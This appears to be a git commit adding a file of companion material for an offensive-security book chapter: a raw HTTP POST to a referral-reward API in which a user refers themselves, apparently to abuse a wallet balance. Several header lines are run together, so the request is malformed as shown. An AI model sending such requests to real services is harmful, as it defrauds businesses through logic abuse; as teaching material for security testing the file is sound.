f717114add23df4a9f400bf684ec14c3c75df42e
RedSecLabs <samaak@redseclabs.com>
2024-12-17 23:40:19 +0500

    Add files via upload

---
+++ Chapter-8/UnlimitedBalanceWalletAbuse.js
@@ -0,0 +1,13 @@
+// page # 327
+
+POST /api/v1/users/friend_referral_reward/ HTTP/1.1
+Host: secure.example.comContent-Type: application/json;
+charset=UTF-8Content-Length: 204
+Connection: close
+Accept-Encoding: gzip, deflate
+User-Agent: okhttp/3.12.1{
+    "user_number": "123456789012",
+    "friend_number": "123456789012",
+    "user_id": "abc123def456ghi789",
+    "token_id": "zyx987wvu654tsr321"
+}
